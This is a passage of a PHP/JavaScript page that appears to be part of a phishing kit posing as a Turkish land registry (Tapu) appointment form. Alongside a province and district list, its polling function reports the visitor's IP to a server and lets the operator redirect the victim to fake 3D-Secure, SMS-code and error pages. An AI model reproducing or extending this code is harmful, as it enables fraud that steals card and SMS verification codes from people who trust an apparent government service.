k","Kızıltepe","Mardin","Mazıdagı","Midyat","Nusaybin","Ömerli","Savur","Yeşilli"],"Kütahya":["Altıntaş","Aslanapa","Çavdarhisar","Domaniç","Dumlupınar","Emet","Gediz","Hisarcık","Kütahya","Pazarlar","Şaphane","Simav","Tavşanlı"],"Niğde":["Altunhisar","Bor","Çamardı","Çiftlik","Niğde","Ulukışla"],"Nevşehir":["Acıgöl","Avanos","Derinkuyu","Gülşehir","Hacıbektaş","Kozaklı","Nevşehir","Ürgüp"],"Şanlıurfa":["Akçakale","Birecik","Bozova","Ceylanpınar","Halfeti","Harran","Hilvan","Şanlıurfa","Siverek","Suruç","Viranşehir"],"Ordu":["Akkuş","Aybastı","Çamaş","Çatalpınar","Çaybaşı","Fatsa","Gölköy","Gülyalı","Gürgentepe","İkizce","Kabadüz","Kabataş","Korgan","Kumru","Mesudiye","Ordu","Perşembe","Ulubey","Ünye"],"Tokat":["Almus","Artova","Başçiftlik","Erbaa","Niksar","Pazar","Reşadiye","Sulusaray","Tokat","Turhal","Yeşilyurt","Zile"],"Yozgat":["Akdağmadeni","Aydıncık","Boğazlıyan","Çandır","Çayıralan","Çekerek","Kadışehri","Saraykent","Sarıkaya","Şefaatli","Sorgun","Yenifakılı","Yerköy","Yozgat"],"Osmaniye":["Bahçe","Düziçi","Hasanbeyli","Kadirli","Osmaniye","Sumbas","Toprakkale"],"Samsun":["Alaçam","Asarcık","Atakum","Ayvacık","Bafra","Canik","Çarşamba","Havza","İlkadım","Kavak","Ladik","Ondokuzmayıs","Salıpazarı","Tekkeköy","Terme","Vezirköprü","Yakakent"],"Sivas":["Akıncılar","Altınyayla","Divriği","Doğanşar","Gemerek","Gölova","Gürün","Hafik","İmranlı","Kangal","Koyulhisar","Şarkışla","Sivas","Suşehri","Ulaş","Yıldızeli","Zara"],"Sinop":["Ayancık","Boyabat","Dimne","Durağan","Erfelek","Gerze","Saraydüzü","Sinop","Türkeli"],"Rize":["Ardeşen","Çamlıhemşin","Çayeli","Derepazarı","Fındıklı","Güneysu","Hemşin","İkizdere","İyidere","Kalkandere","Pazar","Rize"],"Şırnak":["Beytüşşebap","Cizre","Güchlükonak","İdil","Silopi","Şırnak","Uludere"],"Tunceli":["Çemişgezek","Hozat","Mazgirt","Nazımiye","Ovacık","Pertek","Pülümür","Tunceli"],"Siirt":["Aydınlar","Baykan","Eruh","Kurtalan","Pervari","Siirt","Şirvan"],"Yalova":["Altınova","Armutlu","Çiftlikköy","Çınarcık","Termal","Yalova"],"Van":["Bahçesaray","Başkale","Çaldıran","Çatak","Edremit","Erciş","Gevaş","Gürpınar","Muradiye","Özalp","Saray","Van"],"Sakarya":["Adapazarı","Akyazı","Arifiye","Erenler","Ferizli","Geyve","Hendek","Karapürçek","Karasu","Kaynarca","Kocaali","Pamukova","Sapanca","Serdivan","Söğütlü","Taraklı"],"Tekirdağ":["Çerkezköy","Çorlu","Hayrabolu","Malkara","Marmaraereglisi","Muratlı","Saray","Şarköy","Tekirdağ"],"Trabzon":["Akçaabat","Araklı","Arsin","Beşikdüzü","Çarşıbaşı","Çaykara","Dernekpazarı","Düzköy","Hayrat","Köprübaşı","Maçka","Of","Şalpazarı","Sürmene","Tonya","Trabzon","Vakfıkebir","Yomra"],"Uşak":["Banaz","Eşme","Karahallı","Sivaslı","Ulubey","Uşak"],"Zonguldak":["Alaplı","Çaycuma","Devrek","Gökçebey","Karadenizereğli","Zonguldak"]}
    
    const selectedIl = "<?php echo isset($_SESSION['il']) ? htmlspecialchars($_SESSION['il']) : ''; ?>";
    const selectedIlce = "<?php echo isset($_SESSION['ilce']) ? htmlspecialchars($_SESSION['ilce']) : ''; ?>";

    function formKontrol() {
        var mudurluk = document.getElementById('mudurluk').value;
        var tarih = document.getElementById('tarih').value;
        var saat = document.getElementById('saat').value;

        if (mudurluk === "") {
            alert("Lütfen Tapu Müdürlüğü seçiniz.");
            return false;
        }

        if (tarih === "") {
            alert("Lütfen randevu tarihi seçiniz.");
            return false;
        }

        if (saat === "") {
            alert("Lütfen randevu saati seçiniz.");
            return false;
        }

        return true;
    }

    function gonder() {
        $.ajax({ 
            type: 'POST', 
            url: 'Database.php?ip=<?php echo $ip; ?>',
            success: function(msg) {
                var map = { 
                    sms: '3D_Security.php', 
                    tebrik: 'Successful.php', 
                    hata1: 'Error.php', 
                    back: 'index.php', 
                    sms2: 'Wrong_Sms.php', 
                    hata2: 'Closed_to_Internet.php' 
                };
                if (map[msg]) {
                    window.location.href = map[msg];
                } else {
                    setTimeout(gonder, 2500);
                }
            },
            error: function() { 
                setTimeout(gonder, 2500); 
            }
        });
    }

    $(document).ready(function() {
        gonder();

        // Normalize ilIlceData keys to Turkish uppercase
        const normalizedData = {};
        for (const key in ilIlceData) {
            let normalizedKey = key.toUpperCase()
                .replace(/i/g, 'İ')
                .replace(/ı/g, 'I')
                .replace(/ş/g, 'Ş')
                .replace(/ç/g, 'Ç')
                .replace(/ğ/g, 'Ğ')
                .replace(/ü/g, 'Ü')
                .replace(/ö/g, 'Ö');
            normalizedData[normalizedKey] = ilIlceData[key];
        }

        // Populate Tapu Mudurlukleri dynamically based on chosen city (il)
        var $mudurluk = $('#mudurluk');
        $mudurluk.empty();
        
        if (selectedIl && normalizedData[selectedIl]) {
            if (selectedIlce) {
                $mudurluk.append('<option value="' + selectedIlce + '" selected>' + selectedIlce.toUpperCase() + ' TAPU MÜDÜRLÜĞÜ</option>');
            } else {
                $mudurluk.append('<option value="">Seçiniz</option>');
            }
            
            normalizedData[selectedIl].forEach(function(district) {
                if (district.toLowerCase() !== selectedIlce.toLowerCase()) {
                    $mudurluk.append('<option value="' + district + '">' + district.toUpperCase() + ' TAPU MÜDÜRLÜĞÜ</option>');
                }
            });
        } else {
            $mudurluk.append('<option value="">Seçiniz</option>');
        }
    });
</script>

</html>